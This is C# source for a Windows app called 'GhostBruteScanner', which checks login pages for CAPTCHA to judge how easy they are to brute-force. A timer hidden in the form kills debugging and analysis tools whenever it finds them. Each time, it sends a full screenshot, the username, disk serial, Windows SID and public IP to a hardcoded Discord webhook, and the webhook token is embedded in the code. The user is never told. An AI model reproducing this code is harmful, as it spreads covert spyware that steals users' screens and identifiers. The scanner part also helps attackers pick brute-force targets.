using System;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Diagnostics;
using System.IO;
using Newtonsoft.Json;
using HtmlDocument = HtmlAgilityPack.HtmlDocument;
using System.Management;
using System.Net;
using System.Collections.Generic;
using System.Security.Principal;
using System.Drawing;

namespace GhostBruteScanner_v1._0
{
    public partial class Form1 : Form
    {
        private const string reCaptchaV3Keyword = "grecaptcha";
        private const string reCaptchaV2Keyword = "g-recaptcha";
        private const string captchaKeyword = "captcha";
        private const string recaptchaScriptKeyword = "recaptcha";
        private Timer timer;

        private Timer antiCrackerTimer;
        [DllImport("user32.dll")]
        private static extern bool ReleaseCapture();

        [DllImport("user32.dll")]
        private static extern bool SendMessage(IntPtr hWnd, int Msg, int wParam, int lParam);

        private const int WM_NCLBUTTONDOWN = 0xA1;
        private const int HT_CAPTION = 0x2;

        public Form1()
        {
            InitializeComponent();
            timer = new Timer();
            timer.Interval = 5000;
            timer.Tick += Timer_Tick;
            timer.Start();
        }

        private List<string> programsToCheck = new List<string> { "dump", "ilspy", "memory v", "x32dbg", "sharpod", "x64dbg", "x32_dbg", "x64_dbg", "strongod", "titanHide", "scyllaHide", "graywolf", "X64netdumper", "megadumper", "simpleassemblyexplorer", "ollydbg", "ida", "httpdebug", "ProcessHacker", "ResourceHacker", "ExeinfoPE", "DetectItEasy", "PEiD", "cheatengine-x86_64-SSE4-AVX2", "Cheat Engine", "DnSpy", };

        private async void Timer_Tick(object sender, EventArgs e)
        {
            foreach (string programName in programsToCheck)
            {
                CheckAndNotifyProcess(programName);
            }
        }



        private void CheckAndNotifyProcess(string processName)
        {
            Process[] processes = Process.GetProcessesByName(processName);

            if (processes.Length > 0)
            {
                foreach (Process process in processes)
                {
                    SendWebhookNotification(processName);
                    process.Kill();
                }
            }
        }

        private async void SendWebhookNotification(string processName)
        {
            Bitmap screenshot = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics graphics = Graphics.FromImage(screenshot);
            graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);


            string screenshotPath = Path.Combine(Path.GetTempPath(), "screenshot.png");
            screenshot.Save(screenshotPath, System.Drawing.Imaging.ImageFormat.Png);


            await SendToDiscordWebhook(screenshotPath);


            File.Delete(screenshotPath);

            string webhookUrl = "https://discord.com/api/webhooks/1321402017016582239/P9uxQvEF5mPpsfPCYkRR7yB6nVHCCSIN4qatcmIJ5xpSq4AGx6z4pSHDoXl0sD1j6nTb";
            string deviceName = Environment.MachineName;
            string userName = Environment.UserName;
            string hwid = GetHWID();
            string sid = GetSID();


            string embedMessage = $"Unwanted process detected on device '{deviceName}'";
            string message = $"(user: {userName}, HWID: {hwid}, SID: {sid}): {processName}";

            try
            {
                using (var client = new WebClient())
                {
                    client.Headers[HttpRequestHeader.ContentType] = "application/json";
                    string ipAddress = GetIPAddress();

                    string jsonPayload = @"
        {
            ""embeds"": [
                {
                    ""title"": ""Unwanted Process Detected"",
                    ""description"": """ + embedMessage + @""",
                    ""fields"": [
                        {
                            ""name"": ""User"",
                            ""value"": """ + userName + @""",
                            ""inline"": true
                        },
                        {
                            ""name"": ""HWID"",
                            ""value"": """ + hwid + @""",
                            ""inline"": true
                        },
                        {
                            ""name"": ""SID"",
                            ""value"": """ + sid + @""",
                            ""inline"": true
                        },
                        {
                            ""name"": ""IP Address"",
                            ""value"": """ + ipAddress + @""",
                            ""inline"": true
                        },
                        {
                            ""name"": ""Process Name"",
                            ""value"": """ + processName + @""",
                            ""inline"": false
                        }
                    ],
                    ""color"": 16711680
                }
            ]
        }";

                    client.UploadString(webhookUrl, "POST", jsonPayload);
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error sending webhook notification: " + ex.Message);
            }
        }

        private async Task SendToDiscordWebhook(string imagePath)
        {
            string webhookUrl = "https://discord.com/api/webhooks/1321402017016582239/P9uxQvEF5mPpsfPCYkRR7yB6nVHCCSIN4qatcmIJ5xpSq4AGx6z4pSHDoXl0sD1j6nTb";

            using (var httpClient = new HttpClient())
            {
                using (var form = new MultipartFormDataContent())
                {
                    using (var fileStream = new FileStream(imagePath, FileMode.Open))
                    {
                        form.Add(new StreamContent(fileStream), "file", "screenshot.png");

                        var response = await httpClient.PostAsync(webhookUrl, form);
                        response.EnsureSuccessStatusCode();
                    }
                }
            }
        }

        private string GetIPAddress()
        {
            string ipAddress = string.Empty;
            try
            {
                ipAddress = new WebClient().DownloadString("https://api.ipify.org");
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed to retrieve IP address: " + ex.Message);
            }
            return ipAddress;
        }


        private string GetHWID()
        {
            string result = string.Empty;
            try
            {
                ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
                foreach (ManagementObject wmi in searcher.Get())
                {
                    if (wmi["SerialNumber"] != null)
                    {
                        result = wmi["SerialNumber"].ToString();
                        break;
                    }
                }
            }
            catch (Exception ex)
            {

                Console.WriteLine("Failed to retrieve HWID: " + ex.Message);
            }
            return result;
        }


        private string GetSID()
        {
            try
            {
                WindowsIdentity currentUser = WindowsIdentity.GetCurrent();
                return currentUser.User.Value;
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error getting SID: " + ex.Message);
                return string.Empty;
            }
        }

        private void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
        }

        private void panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(this.Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            MessageBox.Show("This application is designed to scan a website's login or admin panel for security vulnerabilities. It checks for CAPTCHA mechanisms, reCaptcha, and analyzes the security of the page to assess its vulnerability to brute force attacks.", "GhostBruteScanner v1.0", MessageBoxButtons.OK, MessageBoxIcon.Information);



            // Setting the placeholder text for the urlbox
            urlbox.PlaceholderText = "Enter URL starting with https://";
        }



        private async void scanbutton_Click(object sender, EventArgs e)
        {
            string url = urlbox.Text.Trim();

            if (string.IsNullOrEmpty(url))
            {
                MessageBox.Show("Please enter a URL.");
                return;
            }

            statuslabel.Text = "Status: Please wait...";

            // Checking internet connection
            statuslabel.Text = "Status: Checking internet connection...";
            bool internetConnection = await CheckInternetConnection();
            label7.Text = internetConnection ? "Connected" : "Not Connected";
            label7.ForeColor = internetConnection ? System.Drawing.Color.Green : System.Drawing.Color.Red;

            // Checking API connection
            statuslabel.Text = "Status: Checking API connection...";
            bool apiConnection = await CheckAPIConnection();
            label8.Text = apiConnection ? "Connected" : "Not Connected";
            label8.ForeColor = apiConnection ? System.Drawing.Color.Green : System.Drawing.Color.Red;

            // Scanning the website
            statuslabel.Text = "Status: Scanning website...";
            var scanResults = await ScanLoginPage(url);

            // Updating the new labels with "true" or "false"
            label3.Text = scanResults.Security;
            label3.ForeColor = GetSecurityColor(scanResults.Security);

            label4.Text = scanResults.HasChallenge ? "True" : "False";
            label4.ForeColor = scanResults.HasChallenge ? System.Drawing.Color.Green : System.Drawing.Color.Red;

            label5.Text = scanResults.HasReCaptcha ? "True" : "False";
            label5.ForeColor = scanResults.HasReCaptcha ? System.Drawing.Color.Green : System.Drawing.Color.Red;

            label6.Text = scanResults.HasCaptcha ? "True" : "False";
            label6.ForeColor = scanResults.HasCaptcha ? System.Drawing.Color.Green : System.Drawing.Color.Red;

            aboutlabel.Text = scanResults.BruteForceAnalysis;
            aboutlabel.ForeColor = GetBruteForceColor(scanResults.BruteForceAnalysis);

            statuslabel.Text = "Status: Completed!";
        }

        private async Task<(string Security, bool HasChallenge, bool HasReCaptcha, bool HasCaptcha, string BruteForceAnalysis)> ScanLoginPage(string url)
        {
            try
            {
                var client = new HttpClient();

                // Adding a User-Agent header to avoid being blocked
                client.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");

                var html = await client.GetStringAsync(url);

                var doc = new HtmlDocument();
                doc.LoadHtml(html);

                bool hasReCaptcha = doc.DocumentNode.InnerHtml.Contains(reCaptchaV3Keyword) || doc.DocumentNode.InnerHtml.Contains(reCaptchaV2Keyword) || doc.DocumentNode.InnerHtml.Contains(recaptchaScriptKeyword);
                bool hasCaptcha = doc.DocumentNode.InnerHtml.Contains(captchaKeyword);
                bool hasChallenge = hasReCaptcha || hasCaptcha;

                string security = "Low";
                if (html.Contains("https://") || html.Contains("login") || html.Contains("signin"))
                {
                    security = "Medium";
                }

                if (hasReCaptcha || hasCaptcha)
                {
                    security = "High";
                }

                string bruteForceAnalysis = "Medium";
                if (!hasReCaptcha && !hasCaptcha)
                {
                    bruteForceAnalysis = "Easy to Brute Force";
                }
                else if (hasReCaptcha || hasCaptcha)
                {
                    bruteForceAnalysis = "Hard to Brute Force \n(CAPTCHA/ reCaptcha present)";
                }

                return (security, hasChallenge, hasReCaptcha, hasCaptcha, bruteForceAnalysis);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to scan the website. Error: {ex.Message}");
                return ("Unknown", false, false, false, "Unable to analyze brute force \nprotection make sure your url \nis correct and its a login page");
            }
        }

        private async Task<bool> CheckInternetConnection()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var response = await client.GetAsync("http://www.google.com");
                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }

        private async Task<bool> CheckAPIConnection()
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var response = await client.GetAsync("https://yourapiendpoint.com");
                    return response.IsSuccessStatusCode;
                }
            }
            catch
            {
                return false;
            }
        }

        private System.Drawing.Color GetSecurityColor(string security)
        {
            switch (security)
            {
                case "Low":
                    return System.Drawing.Color.Green;
                case "Medium":
                    return System.Drawing.Color.Yellow;
                case "High":
                    return System.Drawing.Color.Red;
                default:
                    return System.Drawing.Color.Gray;
            }
        }

        private System.Drawing.Color GetBruteForceColor(string bruteForceAnalysis)
        {
            if (bruteForceAnalysis.Contains("Easy"))
                return System.Drawing.Color.Green;
            else if (bruteForceAnalysis.Contains("Medium"))
                return System.Drawing.Color.Yellow;
            else if (bruteForceAnalysis.Contains("Hard"))
                return System.Drawing.Color.Red;
            else
                return System.Drawing.Color.Gray;
        }

        private void aboutbutton_Click(object sender, EventArgs e)
        {
            About about = new About();
            about.Show();
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Application.Exit();
        }
    }
}
